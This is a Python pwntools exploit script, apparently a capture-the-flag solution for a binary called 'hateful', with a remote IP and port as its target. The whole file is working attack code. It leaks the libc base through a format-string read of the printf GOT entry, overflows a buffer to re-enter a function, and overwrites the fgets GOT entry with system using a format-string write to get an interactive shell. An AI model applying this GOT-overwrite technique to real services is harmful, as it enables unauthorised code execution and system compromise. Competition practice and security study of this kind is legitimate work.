#!/usr/bin/env python3

from pwn import *
from Crypto.Util.number import long_to_bytes

elf = ELF("./hateful")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ('kgx', '-e')

def main():
    if args.REMOTE:
        r = remote('52.59.124.14', 5020)
    else:
        r = gdb.debug('./hateful', '''
                      b send_message
                      c
                      ''')
    
    r.recvuntil(b'>>')
    r.sendline(b'yay')

    # Leak libc base address
    r.recvuntil(b'>>')
    payload = b'%7$s\x00\x00\x00\x00' + p64(elf.got['printf'])
    r.sendline(payload)

    r.recvuntil(b': ')
    printf_address = u64(r.recvline().strip().ljust(8, b'\x00'))
    log.info(f'Leaked printf address: {hex(printf_address)}')

    libc.address = printf_address - libc.sym['printf']
    log.info(f'Found libc base: {hex(libc.address)}')

    r.recvuntil(b'!\n')
    r.sendline(b'/bin/sh\x00' + b'a'*1008 + p64(0x40132E)) # call send_message again

    # Overwrite fgets with system
    r.recvuntil(b'>>')
    payload = fmtstr_payload(6, {elf.got['fgets']: libc.sym['system']}, write_size='short')
    log.info(f'Payload: {len(payload)} : {payload}')
    r.sendline(payload)


    r.interactive()


if __name__ == "__main__":
    main()
